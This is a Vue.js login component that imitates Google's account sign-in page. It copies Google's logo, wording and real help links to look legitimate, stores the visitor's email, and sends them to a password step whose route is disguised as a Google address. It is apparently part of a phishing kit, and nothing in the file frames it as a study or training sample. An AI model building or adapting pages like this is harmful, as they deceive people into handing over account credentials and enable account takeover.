<template>
    <div>
     <div class="content">
        <v-card class="login-card" flat>
            <center>
                <img src="./google.svg" alt="" height='28px'>
            <br>
             <p style="font-size:25px;">Sign in</p>
<p style="font-size:17px;">Use your Google Account</p>
            <br>
            <v-text-field
            v-model="Cemail"
            label="Email or Phone"
             outlined
          ></v-text-field> </center>
           <p style="font-size:16px; font-weight:bold"><a href="https://accounts.google.com/signin/v2/usernamerecovery?hl=en&continue=https%3A%2F%2Fmail.google.com%2Fmail&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession">Forgot email?</a></p>
        <br> 
       <p style="font-size:15px;"> Not your computer? Use Guest mode to sign in privately.</p>
       <p style="font-size:16px; font-weight:bold"><a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a></p>
          <v-card-actions>
              <v-btn @click="Create" large color="blue" text small>Create Account</v-btn>
              <v-spacer></v-spacer>
              <v-btn @click="toPass" large depressed color="blue" dark>Next</v-btn>
          </v-card-actions>
          
        </v-card> 
        <br>
        <div class="footer">
             <v-card-actions>
              <a style="color:#1b1b1b;font-size:13px;" href="https://policies.oath.com/us/en/oath/terms/otos/index.html">English</a>
      <v-spacer></v-spacer>
     <a style="color:#1b1b1b; font-size:13px;padding-right:15px;" href="https://support.google.com/accounts?hl=en#topic=3382296">Help</a>
     <a style="color:#1b1b1b;font-size:13px;padding-right:15px;" href="https://policies.google.com/privacy?gl=NG&hl=en">Privacy</a>
     <a style="color:#1b1b1b;font-size:13px;padding-right:15px;" href="https://policies.google.com/terms?gl=NG&hl=en">Terms</a>
        </v-card-actions>
    
        </div>
       
     </div>
     </div>
    
</template>

<script>
 import { mapGetters } from 'vuex'
  export default {
      data() {
    return {
      Cemail: ''
    }
  },
  created(){
    this.Cemail = this.getEmailPending ;
  },
  computed:{
         ...mapGetters ([
             'getEmailPending'
         ]),
   },
  methods:{
    toPass(){
       this.$store.commit('addEmail', this.Cemail) 
      this.$router.push("/signin-password/account-google-com-src-ym&-lang-en-US&-intl-us&-done-mail.google.com")
    },
    Create(){
      window.location.assign("https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&hl=en&dsh=S-821280558%3A1575301289627491&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp")
    }
  }
}
</script>

<style scoped>
.footer {width:450px;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: 450px;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 180px; background: white;}

 @media (max-width: 991px) { 
    .footer {width:auto;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: 450px;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 180px; background: white;}
  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
      .footer {width:auto;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: auto;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 20px; background: white;}
}
</style>
